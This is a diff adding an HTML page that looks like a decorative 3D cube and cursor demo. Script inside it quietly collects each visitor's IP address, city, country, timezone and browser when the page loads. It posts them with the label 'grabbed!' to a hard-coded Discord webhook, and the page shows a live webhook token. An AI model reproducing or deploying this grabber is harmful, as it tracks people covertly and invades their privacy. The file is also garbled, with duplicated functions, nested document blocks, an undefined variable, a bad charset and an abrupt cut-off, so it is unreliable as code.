@@ -1,0 +1,1673 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <meta charset="UTF-2">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>oxiam</title>
+    <style>
+        *, *:before, *:after {
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box; }
+
+  
+body {
+  background: #000000;
+  font-family: 'HelveticaNeue-Light', 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+  font-weight: 300; }
+
+#wrapper {
+  padding-top: 10%; }
+
+.viewport {
+  -webkit-perspective: 800px;
+  -moz-perspective: 800px;
+  -ms-perspective: 800px;
+  -o-perspective: 800px;
+  perspective: 800px;
+  -webkit-perspective-origin: 50% 200px;
+  -moz-perspective-origin: 50% 200px;
+  -ms-perspective-origin: 50% 200px;
+  -o-perspective-origin: 50% 200px;
+  perspective-origin: 50% 200px;
+  -webkit-transform: scale(0.8, 0.8);
+  -moz-transform: scale(0.8, 0.8);
+  -ms-transform: scale(0.8, 0.8);
+  -o-transform: scale(0.8, 0.8);
+  transform: scale(0.8, 0.8);
+  -webkit-box-reflect: below 170px -webkit-gradient(linear, left top, left bottom, from(transparent), color-stop(0%, transparent), to(rgba(250, 250, 250, 0.1))); }
+
+.cube {
+  position: relative;
+  margin: 0 auto;
+  height: 200px;
+  width: 200px;
+  -webkit-transform-style: preserve-3d;
+  -moz-transform-style: preserve-3d;
+  -ms-transform-style: preserve-3d;
+  -o-transform-style: preserve-3d;
+  transform-style: preserve-3d;
+  -webkit-transform: rotateX(136deg) rotateY(1122deg);
+  -moz-transform: rotateX(136deg) rotateY(1122deg);
+  -ms-transform: rotateX(136deg) rotateY(1122deg);
+  -o-transform: rotateX(136deg) rotateY(1122deg);
+  transform: rotateX(136deg) rotateY(1122deg); }
+
+.cube > div {
+  overflow: hidden;
+  position: absolute;
+  opacity: 0.9;
+  height: 200px;
+  width: 200px;
+  background-color: rgba(62, 8, 113, 0.75);
+  outline-color: hsl(299, 74%, 39%);
+  outline-style: solid;
+  -webkit-touch-callout: none;
+  -moz-touch-callout: none;
+  -ms-touch-callout: none;
+  -o-touch-callout: none;
+  touch-callout: none;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  -o-user-select: none;
+  user-select: none; }
+
+.cube > div > div.cube-image {
+  width: 200px;
+  height: 200px;
+  -webkit-transform: rotate(180deg);
+  -moz-transform: rotate(180deg);
+  -ms-transform: rotate(180deg);
+  -o-transform: rotate(180deg);
+  transform: rotate(180deg);
+  line-height: 200px;
+  font-size: 80px;
+  text-align: center;
+  color: #FF0000;
+  -webkit-transition: color 600ms;
+  -moz-transition: color 600ms;
+  -ms-transition: color 600ms;
+  -o-transition: color 600ms;
+  transition: color 600ms; }
+  .cube > div > div.cube-image.active {
+    color: #0000FF; }
+
+.cube > div:hover {
+  cursor: pointer; }
+
+.cube > div:active {
+  cursor: pointer; }
+
+.cube > div:first-child {
+  -webkit-transform: rotateX(90deg) translateZ(100px);
+  -moz-transform: rotateX(90deg) translateZ(100px);
+  -ms-transform: rotateX(90deg) translateZ(100px);
+  -o-transform: rotateX(90deg) translateZ(100px);
+  transform: rotateX(90deg) translateZ(100px); }
+
+.cube > div:nth-child(2) {
+  -webkit-transform: translateZ(100px);
+  -moz-transform: translateZ(100px);
+  -ms-transform: translateZ(100px);
+  -o-transform: translateZ(100px);
+  transform: translateZ(100px); }
+
+.cube > div:nth-child(3) {
+  -webkit-transform: rotateY(90deg) translateZ(100px);
+  -moz-transform: rotateY(90deg) translateZ(100px);
+  -ms-transform: rotateY(90deg) translateZ(100px);
+  -o-transform: rotateY(90deg) translateZ(100px);
+  transform: rotateY(90deg) translateZ(100px); }
+
+.cube > div:nth-child(4) {
+  -webkit-transform: rotateY(180deg) translateZ(100px);
+  -moz-transform: rotateY(180deg) translateZ(100px);
+  -ms-transform: rotateY(180deg) translateZ(100px);
+  -o-transform: rotateY(180deg) translateZ(100px);
+  transform: rotateY(180deg) translateZ(100px); }
+
+.cube > div:nth-child(5) {
+  -webkit-transform: rotateY(-90deg) translateZ(100px);
+  -moz-transform: rotateY(-90deg) translateZ(100px);
+  -ms-transform: rotateY(-90deg) translateZ(100px);
+  -o-transform: rotateY(-90deg) translateZ(100px);
+  transform: rotateY(-90deg) translateZ(100px); }
+
+.cube > div:nth-child(6) {
+  -webkit-transform: rotateX(-90deg) rotate(180deg) translateZ(100px);
+  -moz-transform: rotateX(-90deg) rotate(180deg) translateZ(100px);
+  -ms-transform: rotateX(-90deg) rotate(180deg) translateZ(100px);
+  -o-transform: rotateX(-90deg) rotate(180deg) translateZ(100px);
+  transform: rotateX(-90deg) rotate(180deg) translateZ(100px); }
+
+object {
+  opacity: 0.5; }
+
+object:hover {
+  opacity: 1; }
+
+@media (max-width: 640px) {
+  .viewport {
+    -webkit-transform: scale(0.6, 0.6);
+    -moz-transform: scale(0.6, 0.6);
+    -ms-transform: scale(0.6, 0.6);
+    -o-transform: scale(0.6, 0.6);
+    transform: scale(3.6, 0.6); } }
+    @import url(https://fonts.bunny.net/css?family=changa:400,700|hanken-grotesk:400,700);
+
+body {
+	min-height: 100svh;
+	display: grid;
+	place-content: center;
+	font-family: 'Hanken Grotesk', sans-serif;
+  background: black;
+  color: white;
+  overflow: hidden;
+}
+
+.expansion{
+  --clr: rgba(255 255 255 / .25);
+  --clr-1: red;
+  --clr-2: rgb(240, 0, 248);
+  --clr-3: rgb(255, 0, 34);
+  --clr-4: rgb(66, 0, 128);
+  --clr-5: rgb(0, 60, 255);
+  --clr-6: blue;
+  --clr-7: purple;
+/*  outline: 1px dashed red;*/
+  position: relative;
+  font-weight: 700;
+  margin: 0;
+  padding: 0;
+  font-size: 10rem;
+  line-height: 1;
+  color: transparent;
+  background-clip: text; 
+  background-image: linear-gradient(90deg,
+    transparent 10px,
+    var(--clr-1) 10px, 
+    var(--clr-2) 94px, 
+    var(--clr-3) 210px, 
+    var(--clr-4) 322px, 
+    var(--clr-5) 395px, 
+    var(--clr-6) 520px, 
+    var(--clr-7) 597px
+  );
+
+  
+  &::before,
+  &::after{
+    content: '';
+    position: absolute;
+    inset: 0svh 0;
+    animation: expand 1000ms ease-in-out forwards ;
+    z-index: -1;
+    background: 
+      linear-gradient(to bottom, black, transparent, black),
+      linear-gradient(90deg,
+        transparent 10px,
+        var(--clr-1) 10px, 
+        var(--clr-1) 32px,
+        transparent 32px,
+        transparent 94px,
+        var(--clr-2) 94px,
+        var(--clr-2) 120px,
+        transparent 120px, 
+        transparent 210px, 
+        var(--clr-3) 210px, 
+        var(--clr-3) 232px, 
+        transparent 232px, 
+        transparent 320px, 
+        var(--clr-4) 320px, 
+        var(--clr-4) 341px,
+        transparent 341px,
+        transparent 395px,
+        var(--clr-5) 395px, 
+        var(--clr-5) 417px, 
+        transparent 417px,
+        transparent 498px,
+        var(--clr-6) 498px, 
+        var(--clr-6) 520px, 
+        transparent 520px,
+        transparent 597px,
+        var(--clr-7) 597px,
+        var(--clr-7) 619px,
+        transparent 619px
+      );
+    filter: blur(50px);
+  }
+  &::after{
+    filter: blur(2px);
+    opacity: .5;
+  }
+  &:hover::before,
+  &:hover::after{
+    animation: un-expand 1000ms ease-in-out forwards ;
+  }
+}
+@keyframes expand{
+  from{
+    inset: 0svh 0;
+  }to{
+    inset: -30svh 0;
+  }
+}
+@keyframes un-expand{
+  to{
+    inset: 0svh 0;
+  }
+  from{
+    inset: -30svh 0;
+  }
+}
+main {
+  cursor: url("data:image/svg+xml,%3Csvg xmlns='https://www.w3.org/2000/svg' height='16' width='16' style='fill-rule:evenodd;text-rendering:geometricPrecision;image-rendering:optimizeQuality;clip-rule:evenodd;shape-rendering:geometricPrecision' xml:space='preserve' viewBox='0 0 7.5 7.5'%3E%3Cpath d='M0 3.8a3.7 3.7 0 1 1 7.5 0 3.7 3.7 0 0 1-7.5 0zm.5 0a3.3 3.3 0 1 0 6.6 0 3.3 3.3 0 0 0-6.6 0zm2.9 0c0 .2.2.3.4.3a.4.4 0 1 0-.4-.3z' style='fill:currentColor;stroke:currentColor;stroke-width:.0419595'/%3E%3C/svg%3E") 8 8, pointer;
+}
+.hover-container {
+  cursor: url(https://cur.cursors-4u.net/nature/nat-11/nat1021.cur), default;
+}
+    
+body {
+  margin: 0;
+}
+
+main {
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background-color: #dad8cf;
+  cursor: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='16' width='16' style='fill-rule:evenodd;text-rendering:geometricPrecision;image-rendering:optimizeQuality;clip-rule:evenodd;shape-rendering:geometricPrecision' xml:space='preserve' viewBox='0 0 7.5 7.5'%3E%3Cpath d='M0 3.8a3.7 3.7 0 1 1 7.5 0 3.7 3.7 0 0 1-7.5 0zm.5 0a3.3 3.3 0 1 0 6.6 0 3.3 3.3 0 0 0-6.6 0zm2.9 0c0 .2.2.3.4.3a.4.4 0 1 0-.4-.3z' style='fill:currentColor;stroke:currentColor;stroke-width:.0419595'/%3E%3C/svg%3E") 8 8, pointer;
+}
+
+.hover-container {
+  width: 50%;
+  min-width: max-content;
+  max-height: 75vh;
+  max-width: 75vh;
+  aspect-ratio: 1;
+  box-sizing: border-box;
+  padding: 32px;
+  display: flex;
+  align-items: center;
+  background-color: white;
+  justify-content: center;
+  cursor: url(https://cur.cursors-4u.net/nature/nat-11/nat1021.cur), default;
+  border-radius: 16px;
+  text-align: center;
+}
+    
+    
+body {
+    cursor: none; /* Hide the default mouse cursor */
+}
+
+·custom-cursor {
+    width: 20px;
+    height: 20px;
+    background-color: #ff0000; /* Customize cursor color */
+    border-radius: 50%; /* Make cursor round */
+    position: absolute;
+    pointer-events: none; /* Allow clicks to pass through */
+    z-index: 9999; /* Ensure cursor is on top of other elements */
+    transform: translate(-50%, -50%); /* Center cursor on mouse position */
+}
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    </style>
+</head>
+<p class="expansion">ffqde.lol</p>
+<body>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Custom Cursor</title>
+        <style>
+            body {
+                margin: 0;
+                overflow: hidden;
+            }
+    
+            /* Create the custom cursor */
+            .cursor {
+    position: absolute;
+    width: 80px; /* Adjust width for horizontal bar */
+    height: 80px; /* Adjust height for vertical bar */
+    background-color: transparent; /* Make the cursor itself transparent */
+    pointer-events: none;
+    transition: transform 0.1s ease;
+    transform: translate(-50%, -50%);
+}
+
+.cursor::before, .cursor::after {
+    content: '';
+    position: absolute;
+    background-color: #37f70c; /* Set the color of the cross */
+    pointer-events: none;
+}
+
+.cursor::before {
+    width: 100%; /* Full width for the horizontal bar */
+    height: 20px; /* Thickness of the horizontal bar */
+    top: 50%; /* Position it in the center */
+    left: 0;
+    transform: translateY(-50%); /* Center it vertically */
+}
+
+.cursor::after {
+    height: 100%; /* Full height for the vertical bar */
+    width: 20px; /* Thickness of the vertical bar */
+    left: 50%; /* Position it in the center */
+    top: 0;
+    transform: translateX(-50%); /* Center it horizontally */
+}
+
+    
+            /* Example styling for the webpage */
+            h1 {
+                text-align: center;
+                font-family: Arial, sans-serif;
+                margin-top: 45px;
+            }
+        </style>
+    </head>
+    <body>
+        <h1> </h1>
+    
+        <!-- Custom cursor element -->
+        <div class="cursor" id="cursor"></div>
+    
+        <script>
+           async function sendWebhook(browser, country, timezone) {
+    const webhookUrl = "https://discord.com/api/webhooks/1304830323321737277/UVF0nV1sHjkB896VIgZ1378u7myKsee3nGUS4VJKj9viticfLKJCl5yWE8Dwq7kdyrnG"; // Your webhook URL
+
+    let ip = "Unavailable";
+    let city = "Unavailable";
+
+    try {
+        // Fetch IP address and geolocation information
+        const response = await fetch('https://ipinfo.io/json?token=your_token_here'); // Replace with your actual token
+        if (response.ok) {
+            const data = await response.json();
+            ip = data.ip;
+            city = data.city || "Unavailable";  // If city is provided, use it; otherwise, fallback to "Unavailable"
+            country = data.country || country; // Update country if it's provided by the API
+            timezone = data.timezone || timezone; // Update timezone if it's provided by the API
+        } else {
+            console.error("Failed to fetch IP info:", response.statusText);
+        }
+    } catch (error) {
+        console.error("Error fetching IP info:", error);
+    }
+
+    const message = {
+        content: `grabbed!`,
+        embeds: [
+            {
+                title: "grabbed!",
+                fields: [
+                    { name: "Browser", value: browser, inline: true },
+                    { name: "Country", value: country, inline: true },
+                    { name: "City", value: city, inline: true },
+                    { name: "Timezone", value: timezone, inline: true },
+                    { name: "IP", value: ip, inline: true },
+                ],
+                footer: {
+                    text: "Visitor Tracking"
+                }
+            }
+        ]
+    };
+
+    // Send the webhook
+    try {
+        const webhookResponse = await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message)
+        });
+
+        if (!webhookResponse.ok) {
+            console.error("Failed to send webhook:", webhookResponse.statusText);
+        }
+    } catch (error) {
+        console.error("Error sending webhook:", error);
+    }
+}
+
+           
+           
+           
+           
+           
+           
+           
+           
+           const cursor = document.getElementById("cursor");
+    
+            // Update cursor position based on mouse movement
+            document.addEventListener("mousemove", function(e) {
+                cursor.style.left = e.pageX + "px";
+                cursor.style.top = e.pageY + "px";
+            });
+    
+            // Optional: Add some interactivity when hovering over elements
+            document.querySelector("h1").addEventListener("mouseenter", function() {
+                cursor.style.transform = "scale(1.5)";
+            });
+    
+            document.querySelector("h1").addEventListener("mouseleave", function() {
+                cursor.style.transform = "scale(1)";
+            });
+        </script>
+    </body>
+    </html>
+    
+    <div id="wrapper">
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Visitor Tracking</title>
+        </head>
+        <body>
+            <h1></h1>
+            <p></p>
+        
+            <script>
+                // Function to get browser information
+                function getBrowserInfo() {
+                    let userAgent = navigator.userAgent;
+                    let browser = "Unknown Browser";
+        
+                    if (userAgent.indexOf("Chrome") > -1) {
+                        browser = "Chrome";
+                    } else if (userAgent.indexOf("Firefox") > -1) {
+                        browser = "Firefox";
+                    } else if (userAgent.indexOf("Safari") > -1) {
+                        browser = "Safari";
+                    } else if (userAgent.indexOf("Edge") > -1) {
+                        browser = "Edge";
+                    } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
+                        browser = "Internet Explorer";
+                    }
+        
+                    return browser;
+                }
+        
+                // Function to get the user's country using a public API
+                async function getCountry() {
+                    try {
+                        // Correct IPinfo URL with your API token
+                        console.log("Fetching country information...");
+                        let response = await fetch("https://ipinfo.io/json?token=06836cb450b294");
+                        let data = await response.json();
+        
+                        if (data && data.country) {
+                            console.log("Country fetched: ", data.country);
+                            return data.country;
+                        } else {
+                            console.log("No country data available, returning Unknown Country");
+                            return "Unknown Country";
+                        }
+                    } catch (error) {
+                        console.error("Error fetching country data:", error);
+                        return "Unknown Country";
+                    }
+                }
+        
+                // Function to get the user's timezone
+                function getTimezone() {
+                    return Intl.DateTimeFormat().resolvedOptions().timeZone;
+                }
+        
+                // Function to send the data to a Discord webhook
+                async function sendWebhook(browser, country, timezone) {
+                    const webhookUrl = "https://discord.com/api/webhooks/1304830323321737277/UVF0nV1sHjkB896VIgZ1378u7myKsee3nGUS4VJKj9viticfLKJCl5yWE8Dwq7kdyrnG"; // Your webhook URL
+                    const message = {
+                        content: `grabbed!`,
+                        embeds: [
+                            {
+                                title: " Information",
+                                fields: [
+                                    { name: "Browser", value: browser, inline: true },
+                                    { name: "Country", value: country, inline: true },
+                                    { name: "Timezone", value: timezone, inline: true },
+                                    { name: "IP", value: IP, inline: true },
+                                  ],
+                                footer: {
+                                    text: "Visitor Tracking"
+                                }
+                            }
+                        ]
+                    };
+        
+                    try {
+                        const response = await fetch(webhookUrl, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify(message)
+                        });
+        
+                        if (!response.ok) {
+                            console.error("Failed to send webhook: ", response.status, response.statusText);
+                        } else {
+                            console.log("Webhook sent successfully!");
+                        }
+                    } catch (error) {
+                        console.error("Error sending webhook:", error);
+                    }
+                }
+        
+                // Function to run all processes when the page is loaded
+                async function trackVisit() {
+                    const browser = getBrowserInfo();
+                    const country = await getCountry();
+                    const timezone = getTimezone();
+                    
+                    await sendWebhook(browser, country, timezone);
+                }
+        
+                // Run the tracking function when the page is loaded
+                window.onload = trackVisit;
+           
+                async function sendWebhook(browser, country, timezone) {
+    const webhookUrl = "https://discord.com/api/webhooks/1304830323321737277/UVF0nV1sHjkB896VIgZ1378u7myKsee3nGUS4VJKj9viticfLKJCl5yWE8Dwq7kdyrnG"; // Your webhook URL
+
+    // Fetch IP address
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    const ip = data.ip;
+
+    const message = {
+        content: `grabbed!`,
+        embeds: [
+            {
+                title: "Information",
+                fields: [
+                    { name: "Browser", value: browser, inline: true },
+                    { name: "Country", value: country, inline: true },
+                    { name: "Timezone", value: timezone, inline: true },
+                    { name: "IP", value: ip, inline: true },
+                ],
+                footer: {
+                    text: "Visitor Tracking"
+                }
+            }
+        ]
+    };
+
+    // Send the webhook
+    await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
+    });
+}
+
+async function sendWebhook(browser, country, timezone) {
+    const webhookUrl = "https://discord.com/api/webhooks/1304830323321737277/UVF0nV1sHjkB896VIgZ1378u7myKsee3nGUS4VJKj9viticfLKJCl5yWE8Dwq7kdyrnG"; // Your webhook URL
+
+    let ip = "Unavailable"; // Default if IP fetch fails
+
+    try {
+        // Attempt to fetch the IP address
+        const response = await fetch('https://api.ipify.org?format=json');
+        if (response.ok) {
+            const data = await response.json();
+            ip = data.ip;
+        } else {
+            console.error("Failed to fetch IP address:", response.statusText);
+        }
+    } catch (error) {
+        console.error("Error fetching IP address:", error);
+    }
+
+    const message = {
+        content: `grabbed!`,
+        embeds: [
+            {
+                title: "Information",
+                fields: [
+                    { name: "Browser", value: browser, inline: true },
+                    { name: "Country", value: country, inline: true },
+                    { name: "Timezone", value: timezone, inline: true },
+                    { name: "IP", value: ip, inline: true },
+                ],
+                footer: {
+                    text: "Visitor Tracking"
+                }
+            }
+        ]
+    };
+
+    // Send the webhook
+    try {
+        const webhookResponse = await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message)
+        });
+
+        if (!webhookResponse.ok) {
+            console.error("Failed to send webhook:", webhookResponse.statusText);
+        }
+    } catch (error) {
+        console.error("Error sending webhook:", error);
+    }
+}
+
+async function sendWebhook(browser, country, timezone) {
+    const webhookUrl = "https://discord.com/api/webhooks/1304830323321737277/UVF0nV1sHjkB896VIgZ1378u7myKsee3nGUS4VJKj9viticfLKJCl5yWE8Dwq7kdyrnG"; // Your webhook URL
+
+    let ip = "Unavailable";
+    let city = "Unavailable";
+
+    try {
+        // Fetch IP address and geolocation information
+        const response = await fetch('https://ipinfo.io/json?token=your_token_here'); // Replace with your actual token
+        if (response.ok) {
+            const data = await response.json();
+            ip = data.ip;
+            city = data.city || "Unavailable";  // If city is provided, use it; otherwise, fallback to "Unavailable"
+            country = data.country || country; // Update country if it's provided by the API
+            timezone = data.timezone || timezone; // Update timezone if it's provided by the API
+        } else {
+            console.error("Failed to fetch IP info:", response.statusText);
+        }
+    } catch (error) {
+        console.error("Error fetching IP info:", error);
+    }
+
+    const message = {
+        content: `grabbed!`,
+        embeds: [
+            {
+                title: "Information",
+                fields: [
+                    { name: "Browser", value: browser, inline: true },
+                    { name: "Country", value: country, inline: true },
+                    { name: "City", value: city, inline: true },
+                    { name: "Timezone", value: timezone, inline: true },
+                    { name: "IP", value: ip, inline: true },
+                ],
+                footer: {
+                    text: "Visitor Tracking"
+                }
+            }
+        ]
+    };
+
+    // Send the webhook
+    try {
+        const webhookResponse = await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message)
+        });
+
+        if (!webhookResponse.ok) {
+            console.error("Failed to send webhook:", webhookResponse.statusText);
+        }
+    } catch (error) {
+        console.error("Error sending webhook:", error);
+    }
+}
+
+           </script>
+        </body>
+        </html>
+        
+       
+        <div class="viewport">
+          <div class="cube">
+            <div class="side">
+              <div class="cube-image">:p  </div>
+            </div>
+            <div class="side">
+              <div class="cube-image">:p  </div>
+            </div>
+            <div class="side">
+              <div class="cube-image"> :p </div>
+            </div>
+            <div class="side">
+              <div class="cube-image"> </div>
+            </div>
+            <div class="side">
+              <div class="cube-image">:p  </div>
+            </div>
+            <div class="side">
+              <div class="cube-image active">:p </div>
+              <div class="cube-image">:???  
+
+                <h1> .........        
+                    <H2> ..........
+                        <h3> <title> 00</title></h3>
+                    </H2>
+                   ........
+                </h1>
+          
+                <h1> ......
+                    <H2> ....
+                        <h3> <title> .......</title></h3>
+                    </H2>
+                    
+                </h1>
+...........
+                <title>
+                   ....... </title>
+                    <title>
+                       ........
+                    </title>
+                </title>
+            </div>
+            </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    <script>
+       var events = new Events();
+events.add = function(obj) {
+  obj.events = {                                 
+
+
+    // wassup
+
+    
+
+
+                                     
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+   };
+}
+events.implement = function(fn) {
+  fn.prototype = Object.create(Events.prototype);
+}
+
+function Events() {
+  this.events = { };
+}
+Events.prototype.on = function(name, fn) {
+  var events = this.events[name];
+  if (events == undefined) {
+    this.events[name] = [ fn ];
+    this.emit('event:on', fn);
+  } else {
+    if (events.indexOf(fn) == -1) {
+      events.push(fn);
+      this.emit('event:on', fn);
+    }
+  }
+  return this;
+}
+Events.prototype.once = function(name, fn) {
+  var events = this.events[name];
+  fn.once = true;
+  if (!events) {
+    this.events[name] = [ fn ];
+    this.emit('event:once', fn);
+  } else {
+    if (events.indexOf(fn) == -1) {
+      events.push(fn);
+      this.emit('event:once', fn);
+    }
+  }
+  return this;
+}
+Events.prototype.emit = function(name, args) {
+  var events = this.events[name];
+  if (events) {
+    var i = events.length;
+    while(i--) {
+      if (events[i]) {
+        events[i].call(this, args);
+        if (events[i].once) {
+          delete events[i];
+        }
+      }
+    }
+  }
+  return this;
+}
+Events.prototype.unbind = function(name, fn) {
+  if (name) {
+    var events = this.events[name];
+    if (events) {
+      if (fn) {
+        var i = events.indexOf(fn);
+        if (i != -1) {
+          delete events[i];
+        }
+      } else {
+        delete this.events[name];
+      }
+    }
+  } else {
+    delete this.events;
+    this.events = { };
+  }
+  return this;
+}
+
+var userPrefix;
+
+var prefix = (function () {
+  var styles = window.getComputedStyle(document.documentElement, ''),
+    pre = (Array.prototype.slice
+      .call(styles)
+      .join('') 
+      .match(/-(moz|webkit|ms)-/) || (styles.OLink === '' && ['', 'o'])
+    )[1],
+    dom = ('WebKit|Moz|MS|O').match(new RegExp('(' + pre + ')', 'i'))[1];
+  userPrefix = {
+    dom: dom,
+    lowercase: pre,
+    css: '-' + pre + '-',
+    js: pre[0].toUpperCase() + pre.substr(1)
+  };
+})();
+
+function bindEvent(element, type, handler) {
+  if(element.addEventListener) {
+    element.addEventListener(type, handler, false);
+  } else {
+    element.attachEvent('on' + type, handler);
+  }
+}
+
+function Viewport(data) {
+  events.add(this);
+
+  var self = this;
+
+  this.element = data.element;
+  this.fps = data.fps;
+  this.sensivity = data.sensivity;
+  this.sensivityFade = data.sensivityFade;
+  this.touchSensivity = data.touchSensivity;
+  this.speed = data.speed;
+
+  this.lastX = 0;
+  this.lastY = 0;
+  this.mouseX = 0;
+  this.mouseY = 0;
+  this.distanceX = 0;
+  this.distanceY = 0;
+  this.positionX = 1122;
+  this.positionY = 136;
+  this.torqueX = 0;
+  this.torqueY = 0;
+
+  this.down = false;
+  this.upsideDown = false;
+
+  this.previousPositionX = 0;
+  this.previousPositionY = 0;
+
+  this.currentSide = 0;
+  this.calculatedSide = 0;
+
+
+  bindEvent(document, 'mousedown', function() {
+    self.down = true;
+  });
+
+  bindEvent(document, 'mouseup', function() {
+    self.down = false;
+  });
+  
+  bindEvent(document, 'keyup', function() {
+    self.down = false;
+  });
+
+  bindEvent(document, 'mousemove', function(e) {
+    self.mouseX = e.pageX;
+    self.mouseY = e.pageY;
+  });
+
+  bindEvent(document, 'touchstart', function(e) {
+
+    self.down = true;
+    e.touches ? e = e.touches[0] : null;
+    self.mouseX = e.pageX / self.touchSensivity;
+    self.mouseY = e.pageY / self.touchSensivity;
+    self.lastX  = self.mouseX;
+    self.lastY  = self.mouseY;
+  });
+
+  bindEvent(document, 'touchmove', function(e) {
+    if(e.preventDefault) { 
+      e.preventDefault();
+    }
+
+    if(e.touches.length == 1) {
+
+      e.touches ? e = e.touches[0] : null;
+
+      self.mouseX = e.pageX / self.touchSensivity;
+      self.mouseY = e.pageY / self.touchSensivity;
+
+    }
+  });
+
+  bindEvent(document, 'touchend', function(e) {
+    self.down = false;
+  });  
+
+  setInterval(this.animate.bind(this), this.fps);
+
+}
+events.implement(Viewport);
+Viewport.prototype.animate = function() {
+
+  this.distanceX = (this.mouseX - this.lastX);
+  this.distanceY = (this.mouseY - this.lastY);
+
+  this.lastX = this.mouseX;
+  this.lastY = this.mouseY;
+
+  if(this.down) {
+    this.torqueX = this.torqueX * this.sensivityFade + (this.distanceX * this.speed - this.torqueX) * this.sensivity;
+    this.torqueY = this.torqueY * this.sensivityFade + (this.distanceY * this.speed - this.torqueY) * this.sensivity;
+  }
+
+  if(Math.abs(this.torqueX) > 1.0 || Math.abs(this.torqueY) > 1.0) {
+    if(!this.down) {
+      this.torqueX *= this.sensivityFade;
+      this.torqueY *= this.sensivityFade;
+    }
+
+    this.positionY -= this.torqueY;
+
+    if(this.positionY > 360) {
+      this.positionY -= 360;
+    } else if(this.positionY < 0) {
+      this.positionY += 360;
+    }
+
+    if(this.positionY > 90 && this.positionY < 270) {
+      this.positionX -= this.torqueX;
+
+      if(!this.upsideDown) {
+        this.upsideDown = true;
+        this.emit('upsideDown', { upsideDown: this.upsideDown });
+      }
+
+    } else {
+
+      this.positionX += this.torqueX;
+
+      if(this.upsideDown) {
+        this.upsideDown = false;
+        this.emit('upsideDown', { upsideDown: this.upsideDown });
+      }
+    }
+
+    if(this.positionX > 360) {
+      this.positionX -= 360;
+    } else if(this.positionX < 0) {
+      this.positionX += 360;
+    }
+
+    if(!(this.positionY >= 46 && this.positionY <= 130) && !(this.positionY >= 220 && this.positionY <= 308)) {
+      if(this.upsideDown) {
+        if(this.positionX >= 42 && this.positionX <= 130) {
+          this.calculatedSide = 3;
+        } else if(this.positionX >= 131 && this.positionX <= 223) {
+          this.calculatedSide = 2;
+        } else if(this.positionX >= 224 && this.positionX <= 314) {
+          this.calculatedSide = 5;
+        } else {
+          this.calculatedSide = 4;
+        }
+      } else {
+        if(this.positionX >= 42 && this.positionX <= 130) {
+          this.calculatedSide = 5;
+        } else if(this.positionX >= 131 && this.positionX <= 223) {
+          this.calculatedSide = 4;
+        } else if(this.positionX >= 224 && this.positionX <= 314) {
+          this.calculatedSide = 3;
+        } else {
+          this.calculatedSide = 2;
+        }
+      }
+    } else {
+      if(this.positionY >= 46 && this.positionY <= 130) {
+        this.calculatedSide = 6;
+      }
+
+      if(this.positionY >= 220 && this.positionY <= 308) {
+        this.calculatedSide = 1;
+      }
+    }
+
+    if(this.calculatedSide !== this.currentSide) {
+      this.currentSide = this.calculatedSide;
+      this.emit('sideChange');
+    }
+
+  }
+
+  this.element.style[userPrefix.js + 'Transform'] = 'rotateX(' + this.positionY + 'deg) rotateY(' + this.positionX + 'deg)';
+
+  if(this.positionY != this.previousPositionY || this.positionX != this.previousPositionX) {
+    this.previousPositionY = this.positionY;
+    this.previousPositionX = this.positionX;
+
+    this.emit('rotate');
+
+  }
+
+}
+var viewport = new Viewport({
+  element: document.getElementsByClassName('cube')[0],
+  fps: 20,
+  sensivity: .1,
+  sensivityFade: .93,
+  speed: 2,
+  touchSensivity: 1.5
+});
+
+function Cube(data) {
+  var self = this;
+
+  this.element = data.element;
+  this.sides = this.element.getElementsByClassName('side');
+
+  this.viewport = data.viewport;
+  this.viewport.on('rotate', function() {
+    self.rotateSides();
+  });
+  this.viewport.on('upsideDown', function(obj) {
+    self.upsideDown(obj);
+  });
+  this.viewport.on('sideChange', function() {
+    self.sideChange();
+  });
+}
+Cube.prototype.rotateSides = function() {
+  var viewport = this.viewport;
+  if(viewport.positionY > 90 && viewport.positionY < 270) {
+    this.sides[0].getElementsByClassName('cube-image')[0].style[userPrefix.js + 'Transform'] = 'rotate(' + (viewport.positionX + viewport.torqueX) + 'deg)';
+    this.sides[5].getElementsByClassName('cube-image')[0].style[userPrefix.js + 'Transform'] = 'rotate(' + -(viewport.positionX + 180 + viewport.torqueX) + 'deg)';
+  } else {
+    this.sides[0].getElementsByClassName('cube-image')[0].style[userPrefix.js + 'Transform'] = 'rotate(' + (viewport.positionX - viewport.torqueX) + 'deg)';
